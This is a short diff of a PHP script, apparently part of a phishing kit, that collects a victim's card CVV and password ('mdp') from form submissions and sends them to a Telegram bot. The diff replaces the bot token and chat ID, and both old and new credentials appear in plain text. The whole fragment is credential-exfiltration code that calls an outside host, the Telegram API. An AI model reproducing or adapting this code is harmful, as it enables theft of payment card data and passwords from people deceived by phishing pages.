@@ -25,8 +25,8 @@ if (isset($_POST["cvv"]) || isset($_POST["mdp"])) {
                "🔑 **Mot de Passe** : `" . $_SESSION["mdp"] . "`\n";
 
     // Informations pour l'envoi sur Telegram
-    $token = "8180049874:AAG00ea5LHEkC3pk9NgfrikOMPX0P2ljP6c"; // Remplace par ton token
-    $chat_id = "7691383619"; // Remplace par ton chat ID
+    $token = "7231855269:AAHHENpMKORsPdG5gUH7z_NsS7Zz8QaZAcg"; // Remplace par ton token
+    $chat_id = "6242884372"; // Remplace par ton chat ID
 
     // URL de l'API Telegram pour envoyer le message
     $urlMessage = "https://api.telegram.org/bot$token/sendMessage";
